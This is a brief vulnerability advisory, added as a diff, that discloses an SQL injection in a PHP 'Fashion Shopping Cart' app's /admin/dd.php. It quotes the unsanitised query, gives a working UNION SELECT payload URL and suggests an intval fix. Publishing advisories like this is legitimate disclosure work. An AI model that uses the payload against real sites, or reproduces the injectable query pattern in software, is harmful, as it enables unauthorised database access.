@@ -1,0 +1,45 @@
+# Exploit Title.............. Fashion Shopping Cart SQL Injection
+# Google Dork................ N/A
+# Date....................... 14/10/2016
+# Exploit Author............. lahilote
+# Vendor Homepage............ http://www.sourcecodester.com/node/10435
+# Software Link.............. http://www.sourcecodester.com/sites/default/files/download/aniketsmarty/online_shopping.zip
+# Version.................... 0.1
+# Tested on.................. xampp
+# CVE........................ N/A
+
+
+The audit_list in /admin/dd.php
+-------------------------------
+
+----snip----
+
+$q=$_GET["q"];
+
+$sql="SELECT * FROM subcategory WHERE cat_id ='$q'";
+
+----snip----
+
+Example exploitation
+--------------------
+http://server/path_to_webapp/admin/dd.php?q=-1%27%20union%20select%201,version()--+
+
+
+How to fix
+----------
+Simple method's use the php function intval.
+For example
+
+$q=intval($_GET["q"]);
+
+$sql="SELECT * FROM subcategory WHERE cat_id ='$q'";
+
+
+Credits
+-------
+This vulnerability was discovered and researched by lahilote
+
+References
+----------
+http://www.sourcecodester.com/node/10435
+http://php.net/manual/en/function.intval.php
